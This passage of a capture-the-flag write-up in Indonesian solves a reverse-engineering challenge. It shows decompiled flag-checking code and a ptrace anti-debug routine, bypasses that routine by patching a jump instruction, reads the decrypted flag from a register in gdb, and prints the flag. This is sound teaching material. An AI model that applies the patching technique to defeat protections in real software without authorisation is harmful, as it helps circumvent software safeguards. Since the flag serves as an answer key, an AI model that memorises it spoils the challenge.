    v8 = (int)v7++;
    v6 = 0x5BD1E995 * v6 + 0x273CB;
    s2[v8] = BYTE2(v6) ^ (__ROR1__(cipher[v8], 3) - BYTE1(v6));
    for ( i = 0; i <= 4999; ++i )
      ;
  }
  if ( strncmp(s1, s2, n: v4) == 0 )
    puts(s: "Correct!");
  else
    puts(s: "Wrong flag!");
  return 0;
}
```
## Solution
Karena dia perbandingannya langsung flag jadi, kalau didebug dan liat RSI saat di instruction strcpy, flag nya langsung keliatan. Namun masalahnya ada anti debug di sini.
```asm
public anti_debug
anti_debug proc near
; __unwind {
sub     rsp, 8
xor     ecx, ecx
xor     esi, esi
xor     edi, edi        ; request
xor     eax, eax
mov     edx, 1
call    _ptrace
test    rax, rax
js      short loc_10C0

loc_10C0:
lea     rdi, s          ; "Debugger Detected!"
call    _puts
mov     edi, 1          ; status
call    _exit
; } // starts at 10A0
anti_debug endp
```

Di sini dia akan print "Debugger Detected dan exit jika terdetect menggunakan debugger. Solusinya tinggal dipatch aja js nya jadi jz agar bisa bypass.

Setelah itu, di debugger kita pasang breakpoint di instruction 
```  0x00005555555551ab <+203>:   call   0x555555555030 <strncmp@plt>```.
Kita input asal aja flagnya dan nanti langsung muncul flag nya di RSI
```
──────────────────────────────────────────────────────────────[ LAST SIGNAL ]───────────────────────────────────────────────────────────────
Breakpoint hit at 0x5555555551ab
───────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────
 RAX  0x1388
 RBX  0
 RCX  0xb3ea6c04
 RDX  0x2f
 RDI  0x7fffffffd810 ◂— 'adaadadadadada'
 RSI  0x7fffffffd880 ◂— 'NevComp3.0{tr4c3_m3_1f_y0u_c4n_w1th_gdb_ptr4c3}'
```
flag: NevComp3.0{tr4c3_m3_1f_y0u_c4n_w1th_gdb_ptr4c3}

---
[Back to home](#categories)
